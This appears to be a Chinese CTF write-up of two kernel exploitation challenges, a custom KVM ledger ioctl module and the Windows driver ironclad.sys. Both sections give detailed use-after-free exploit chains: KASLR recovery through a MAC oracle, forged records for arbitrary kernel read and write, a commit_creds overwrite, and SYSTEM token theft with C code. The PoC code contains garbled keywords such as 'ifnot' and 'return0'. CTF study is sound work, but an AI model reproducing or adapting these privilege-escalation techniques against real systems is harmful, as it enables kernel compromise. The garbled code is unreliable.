guest由 `qemu-system-x86_64 -enable-kvm -cpu host -m 256M -smp 1` 启动，cmdline为 `console=ttyS0 quiet kaslr pti=on panic=-1` ，无网络，宿主必须支持嵌套虚拟化，因为guest内部还要再建VM。附件只有 `bzImage` 、 `initramfs.cpio.gz` 和启动脚本，没有kernel config、vmlinux、 `System.map` ，也没有KVM补丁源码，符号与结构体偏移只能从exp的硬编码常量和运行时泄露反推。单核让slab布局相对确定，256MB限制了堆喷射规模，只能做小对象精确复用； `panic=-1` 加 `quiet` 意味着一次错误写入就会断连且看不到崩溃栈，利用必须一次跑通泄露、写原语与提权。

账本模型：租户为private page发布receipt，其他租户依次witness、co-sign、settle、accept、fold，每步记为entry，角色分离使单条回执无法走完全程。guest内提供 `/dev/kvm` 与 `/usr/bin/shadowctl` ， `shadowctl demo` 只走普通审计路径，会命中角色门禁。

所有账本ioctl都作用在KVM VM fd上，说明题目在KVM内部加了一层收据状态机，而不是另建字符设备。 `_IOC` 把方向、type、nr、size打进32位请求号，自定义nr集中在 `0xe0` 到 `0xee` ，与KVM原生请求同属type `0xae` ，在VM fd上按nr二次分派：

| ioctl | 来源  | 作用  |
| --- | --- | --- |
| `0xae01` | KVM | `KVM_CREATE_VM` |
| `0xaee0` | 账本  | 初始化账本/VM上下文 |
| `0xc040aed4` | KVM | `KVM_CREATE_GUEST_MEMFD` |
| `0x40a0ae49` | KVM | `KVM_SET_USER_MEMORY_REGION2` |
| `0x4020aed2` | KVM | `KVM_SET_MEMORY_ATTRIBUTES` |
| `0x4040ae79` | KVM | `KVM_IOEVENTFD` |
| `0xc070aee1` | 账本  | publish，提交回执 |
| `0xc070aee2` | 账本  | certify |
| `0x4070aee3` | 账本  | co-sign |
| `0x4070aee4` | 账本  | accept |
| `0xc050aee5` | 账本  | settle |
| `0x4050aee6` | 账本  | renew/状态迁移 |
| `0xc020aee7` | 账本  | peek，读回执字段 |
| `0x4088aeea` | 账本  | 带MAC的状态检查/oracle |
| `0xaeeb` | 账本  | fold/运行触发器 |
| `0xc0c0aeee` | 账本  | fold准备，写折叠记录 |

size位给出结构体大小： `0xc070aee1` 是0x70、 `0xc050aee5` 与 `0x4050aee6` 是0x50、 `0x4088aeea` 是0x88、 `0xc0c0aeee` 是0xc0，每条命令都用一个定长结构体整体进出内核，字段按固定偏移排列，这也是后面能在 `0x260` 、 `0x2a8` 读出key材料的前提。方向位区分纯输出（peek）、纯输入（co-sign/accept）与双向（publish/settle/fold准备）。利用顺序因此固定：先 `KVM_CREATE_VM` ，再初始化账本，后续回执操作全部走同一个VM fd，关闭fd则账本上下文与所有回执一起销毁。

漏洞： `renew` / `revoke` 只把回执标记为失效并从活跃链表摘除，没有撤销peek缓存、accept队列与其他回执里保存的指针。对象随后释放回slab，旧句柄仍能通过peek/accept进入内核，形成UAF读；回执底层与 `guest_memfd` 的slot共用分配路径，同尺寸对象（eventfd上下文、slot、btree节点）会复用这块内存，旧句柄读到的已是新对象内容。利用分两段：先用UAF读泄露key/nonce并确认槽可复用，再用UAF写覆盖slot0里的折叠记录，让fold按攻击者给的地址与值执行内核写，最终落到 `commit_creds` 路径。附件不足以确认具体是哪个ioctl在哪个错误分支提前free，这里只按脚本实际执行的顺序描述原语。

布局判据：publish/certify后不立刻peek，而是检查 `KVM_SET_USER_MEMORY_REGION2` 返回结构里的flags与计数字段。该结构与账本slot共享内存布局，只有回执落在预期slot且region字段与初始化写入的值一致时，peek的固定偏移才指向目标字段；否则读到相邻对象。脚本把它当布局旁证，不满足就关闭fd重建，最多32次，把slab随机化过滤成可预测布局。

slide oracle： `0x4088aeea` 接收0x88字节结构体，内含候选slide、用泄露key算出的MAC与期望状态，账本用自身key重算tag，只有匹配才返回通过。于是它等价于1比特判定器， `candidate=i<<21` 、 `i` 取0到511正好覆盖x86-64默认1GB的KASLR窗口，512次ioctl即可唯一确定slide；MAC带密钥，错误候选不会因为地址可映射而误判。

任意写：折叠记录带目标地址、写值与长度，fold在账本上下文里按记录执行写，等价于把受控值写到slide换算后的内核地址。脚本先算出 `commit_creds` 的运行时地址，再把补丁值写进对应位置； `SHAPE SLOT0 FREE/REFILL` 保证slot0的旧回执被释放后由伪造记录精确占位， `ACCEPT C SECOND` 让记录进入待fold链表， `FOLD C ROOT` 才真正触发写入。写成功后不再需要第二次UAF，直接读flag即可。

### 3\. 解题过程

1.  以nobody进入guest，确认 `/dev/kvm` 与 `shadowctl` 可用，用 `upload` 助手按base64(gzip)分块上传静态exp，单行512字符、单独一行 `EOF` 结束，等 `ready:`后执行 `/tmp/exp` 。
    
2.  打开 `/dev/kvm` ， `KVM_CREATE_VM` 后调 `0xaee0` 初始化账本，用 `KVM_CREATE_GUEST_MEMFD` 与 `KVM_SET_MEMORY_ATTRIBUTES` 标记private页，再用 `KVM_SET_USER_MEMORY_REGION2` 映射；publish A、certify B，检查region2返回的flags与计数，不符就关fd重建，最多32次。
    
3.  泄露： `PEEK C SECRET` 、 `PEEK OLD NONCE` 、 `PEEK CRED` 读出本应隔离的字段； `SHAPE FREE` / `SHAPE REFILL` 释放回执并用同尺寸对象占位，验证旧引用仍可读； `eventfd` 加 `KVM_IOEVENTFD C` 用内核对象填充空槽； `ACCEPT C` 、 `RENEW C` 在槽被占位后继续推进状态，读出 `0x260` 、 `0x2a8` 两处key材料。
    
4.  枚举 `i=0..511` 的 `i<<21` 作为候选slide，用泄露key算MAC后调 `0x4088aeea` ，命中后打印 `KASLR slide` ，再用 `SCRATCH MODE2` 、 `FOLD PREP MODE2` 、 `MODE2 MAC` 复算一次，避免单比特碰撞。
    
5.  `SHAPE SLOT0 FREE/REFILL` 释放slot0并用受控记录占位， `ACCEPT C SECOND` 让记录进入fold队列， `PATCH COMMIT_CREDS` 把slide换算出的地址与补丁值写进伪造记录， `FOLD C ROOT` 触发内核写。
    
6.  `geteuid()` 返回0后打开并读取 `/flag` ，打印 `flag: ...`，末尾再发一次 `0xaeeb` 并用 `geteuid()==0` 确认提权不是偶然返回值。
    

### 4\. PoC

```python
import base64, gzip, re, socket, time

DONE = re.compile(rb"__SHADOW_DONE__(\d+)")
FLAG = re.compile(rb"flag:[ \t]*([^\r\n]+)")
HOST, PORT = "shadow", 1337

def until(s, tok, timeout):
    s.settimeout(timeout)
    buf = b""
    while tok notin buf:
        chunk = s.recv(4096)
        ifnot chunk:
            raise RuntimeError("connection closed")
        buf += chunk
    return buf

def upload(s, raw):
    blob = base64.b64encode(gzip.compress(raw, 9))
    until(s, b"Launching shell as nobody", 120)
    s.sendall(b"upload\n")
    for i in range(0, len(blob), 512):
        s.sendall(blob[i:i + 512] + b"\n")
        if (i // 512) % 16 == 15:
            time.sleep(0.03)
    s.sendall(b"EOF\n")
    until(s, b"ready:", 120)
    s.sendall(b"/tmp/exp; echo __SHADOW_DONE__$?\n")

def run(raw):
    s = socket.create_connection((HOST, PORT), 30)
    upload(s, raw)
    buf = b""
    s.settimeout(600)
    whileTrue:
        try:
            chunk = s.recv(65536)
        except socket.timeout:
            break
        ifnot chunk:
            break
        buf += chunk
        m = FLAG.search(buf)
        if m:
            return m.group(1).decode()
    returnNone
```

* * *

## PWN17-Ironclad

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 附件题 |
| 附件  | 有   |
| 目标  | 无（离线附件） |

Flag：flag{59b5c4b55e2a5c09dec66bb3aad099ae}

### 2\. 题目分析

`ironclad.sys` （42008字节）实现“用户态提交指令流、内核侧操作对象”的小VM：每个session有RING、DESC数组与事务TXN，结构带SipHash标签。SDDL允许 `AU` 读写，可直接 `CreateFileA("\\.\Ironclad")` ，IOCTL均为 `FILE_ANY_ACCESS` 加METHOD_BUFFERED，边界由驱动自查。镜像基址 `0x140000000` ，`.kdp` 在 `0x14001a000` ，DriverEntry生成两把SipHash密钥写入`.kdp+0x30/.kdp+0x40` ，23个handler写进`.kdp+0x50` 后由 `MmProtectDriverSection` 只读化。

漏洞在对象读取缓存上。 `FUN_1400031d0` （op3）→ `FUN_140003c7c` ：

```
0x3990(ring,idx,&DESC);                 // 槽校验，DESC 补高位标记
hit = ring[0x26]!=0 && ring[0x20]==idx && (u16)ring[0x24]==(u16)slot.gen && ring[0x30]==DESC;
if (hit) 校验 ring[0x40] 的MAC后返回 ring[0x38]/ring[0x28];
else     建立缓存并把 data/size/DESC 写进 ring[0x20..0x48];
```

每个RING只有一个缓存条目，缓存的是“当时”的data指针与size。resize（op6）成功后调 `FUN_140003b30` 遍历 `DESC->SHDW` 的ACT链表，但只在 `cached_idx==idx && cached_DESC==DESC` 时清缓存：

```
140003b78: 44 39 50 20  cmp %r10d,0x20(%rax)   ; 缓存idx == 被resize的idx?
140003b7c: 75 18        jne 140003b96
140003b7e: 4c 39 58 30  cmp %r11,0x30(%rax)    ; 缓存DESC == 被resize的DESC?
```

DESC是对象，槽号只是引用，同一对象可被export/import到别的session的不同槽号。A用自己的槽号x读O，B用y≠x resize同一DESC：旧缓冲区释放，遍历到A时槽号不等被跳过，A再读命中缓存，拿到已释放的地址与长度，op3与op5变成UAF读写。

关键结构：

| 结构  | 字段  |
| --- | --- |
| RING | `+0x00 'RING'`<br><br>、 `+0x04 id` 、 `+0x08 RSEC` 、 `+0x10/+0x14` 游标、 `+0x18 mode` 、 `+0x20..0x48` 缓存、 `+0x48/+0x50` 链表、 `+0x58` 事务表、 `+0x80` 槽数组（每项0x18） |
| RSEC | `+0x00 'RSEC'`<br><br>、 `+0x04 id` 、 `+0x08` 回指RING、 `+0x48` 16字节本会话SipHash密钥 |
| DESC | `+0x08 size`<br><br>、 `+0x0c flags` 、 `+0x10 data` 、 `+0x18 refcount` 、 `+0x20` canary、 `+0x28 SHDW` |
| TXN | `+0x00 'TXNS'`<br><br>、 `+0x04 handle` 、 `+0x08 ring` 、 `+0x10 DESC` 、 `+0x18` 数据快照、 `+0x20` 缓冲区、 `+0x28 len` 、 `+0x30 MAC` |

三个原语配合起来：

1.  `0x222408` 输出0x40字节， `flag&2` 时 `+0x38` 是 `*(u64*)(ring+8)` ，即RSEC指针，这是全驱动唯一的内核指针泄漏。
    
2.  op10（begin）把 `DESC->data` 快照进 `txn+0x18` ，op11（commit）只检查“当前size≥txn len”就 `memcpy(txn+0x18,txn+0x20,len)` ；中间resize让旧缓冲区释放且size变大，commit就写到已释放块起始处。
    
3.  op14用 `RSEC+0x48` 对 `DESC->data+off` 求SipHash，而TXN MAC与缓存MAC都是单级 `SipHash(RSEC+0x48,blob)` ，这个oracle就是MAC伪造机。
    

池分配粒度： `ExAllocatePool2` 块大小是round_up(请求+0x10,0x10)，canary(len=0x30)与TXN记录同为0x50块，canary(len=0x1f0)与mode0 RING（ `0x10*0x18+0x80=0x200` ）同为0x210块，这决定了填充对象长度。

提权走EPROCESS遍历，build是26300.9818，公开偏移不可用。读IAT槽 `drv+0x6048` 取 `ExAllocatePool2` 地址，按页向下扫第一个 `MZ` 且 `e_lfanew` 处为 `PE\0\0` 的镜像得nt基址；导出表二分 `PsInitialSystemProcess` 并解引用得到System的EPROCESS； `ImageFileName` 在其前0x800字节找 `System` 加全0、取离 `0x5a8` 最近的候选（ `0x338` ）； `ActiveProcessLinks` 用 `X->Flink->Blink==X` 自证（ `0x110` ），顺链表比对 `UniqueProcessId` 与 `GetCurrentProcessId()` 。

Token偏移常规做法是找 `_TOKEN_SOURCE.SourceName` 为 `*SYSTEM*` ，本build没命中，于是收集System与自己两份EPROCESS里“都是内核指针且不相等”的偏移，按离 `0x4b8` 排序，逐个 `kwrite` 后用 `GetTokenInformation(TokenUser)` 检查SID是否为 `S-1-5-18` ，不是就写回原值。读flag后必须睡死：假RING破坏了全局会话链表，退出时 `IRP_MJ_CLOSE` 会unlink并bugcheck， `0x47b0` 释放假TXN时也会free假指针。

### 3\. 解题过程

1.  反编译 `ironclad.sys` （152个函数），确认IRP分发、IOCTL表与对象布局； `0x22240c` 的mode=1栈溢出是DoS陷阱， `0x222410` 是死代码。
    
2.  建S1/S2两个session（mode0，s1=s2=0x100），S2先建8个filler让槽号从8开始；S1创建L(0x30)与Y(0x1f0)并export，S2 import到槽8/9。
    
3.  S2读槽8建立指向L缓冲区的缓存，S1 resize(L,0x1000)释放该缓冲区（槽号不同，缓存不清），S2再读槽8仍拿到旧内容，UAF确认。
    
4.  阶段A：循环240次 `begin(Y,0x10)` 且不abort，每次永久吃掉一个0x50块，逐次读槽8看前4字节是否为 `TXNS` ，命中后从 `txn+0x08/+0x10/+0x18` 读出RING、DESC_Y与P_Y，再 `begin(Y,0x1a0)` 拿写事务。
    
5.  阶段B：S2读槽9把缓存指向P_Y，S1 resize(Y,0x1000)释放0x210块；预绑128个session handle后依次 `create` ，把RING打进该块，命中后读 `ring+0x08` 得RSEC、 `ring+0x48` 得Flink，减 `0x82f8` 并做页对齐校验得到驱动基址。
    
6.  阶段C：构造0x1a0字节RING镜像（ `+0x58` 指向自身事务表、三个假TXN的MAC用op14算）， `op22(hw,...)` 后commit写入P_Y，并把用户态 `ins/outs` 重同步为镜像里的游标。
    
7.  阶段D： `forge_cache` 伪造0x28字节缓存条目交给 `TXN_C` 改写 `ring+0x20` ，op3即可读任意地址；伪造TXN记录交给 `TXN_P` 写进 `ring+0x160` ，op22的 `memcpy(*(txn->buffer)+off,...)` 即任意写。随后扫nt基址、取System EPROCESS、找自身、试写token并用SID校验，读 `C:\flag.txt` 后 `Sleep` 不返回。
    

### 4\. PoC

```javascript
/* MAC oracle：op4 把数据写进对象 X，op14 用本会话密钥求 SipHash */
static u64 mac(Sess *s, const void *blob, u32 len)
{
 M_write(s, g_xslot, 0, len, (void *)blob);
return M_hash(s, g_xslot, 0, len).ret;
}

/* 伪造缓存条目：哈希时 active 被强制 0，落盘时改 1 */
static void forge_cache(u64 addr, u32 size)
{
 u8 blob[0x28] = {0}, st[0x28];

 wr16(blob + 4, (u16)g_gen_x);
 wr32(blob + 8, size);
 wr64(blob + 0x10, g_desc_x);
 wr64(blob + 0x18, addr);
 wr64(blob + 0x20, g_ring);
 u64 m = mac(&S4, blob, 0x28);
memcpy(st, blob, 0x28);
 wr16(st + 6, 1);
 wr64(st + 0x20, m);
 M_twrite(&S4, 4, 0, 0x28, st); /* TXN_C 的 buffer = ring+0x20 */
}

static void kread_(u64 addr, void *buf, u32 len)
{
 forge_cache(addr, len);
 M_read(&S4, 0, 0, len, buf); /* 命中缓存 → memcpy(buf, addr, len) */
}

/* op22 = memcpy(*(txn->buffer)+off, user, len)，buffer 来自伪造 TXN 记录 */
static void kwrite_(u64 addr, const void *buf, u32 len)
{
 u8 blob[0x38] = {0}, txn[0x38] = {0};

 wr32(blob + 0, 5);
 wr32(blob + 8, len);
 wr64(blob + 0x10, g_ring);
 wr64(blob + 0x28, addr);
 wr64(blob + 0x30, g_ring + 0x160);
 u64 m = mac(&S4, blob, 0x38);
 wr32(txn + 0, 0x534e5854);
 wr32(txn + 4, 5);
 wr64(txn + 8, g_ring);
 wr64(txn + 0x20, addr);
 wr32(txn + 0x28, len);
 wr64(txn + 0x30, m);
 M_twrite(&S4, 1, 0, 0x38, txn); /* 借 TXN_P 改 TXN_X 记录 */
 M_twrite(&S4, 5, 0, len, (void *)buf);
}

static int steal_token(u64 mine, u64 sys_ep)
{
 u64 tok = kread64(sys_ep + g_token_off);
 HANDLE h;
 DWORD n;
 u8 sid[0x40];

 kwrite_(mine + g_token_off, &tok, 8);
if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h))
return0;
 GetTokenInformation(h, TokenUser, sid, sizeof(sid), &n);
 CloseHandle(h);
return *(u32 *)(sid + 4) == 0; /* S-1-5-18 的 RID 为 0 */
}
```

* * *
